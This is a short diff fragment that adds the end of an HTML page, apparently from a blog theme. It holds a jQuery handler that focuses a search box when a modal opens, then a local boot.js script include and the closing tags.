+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
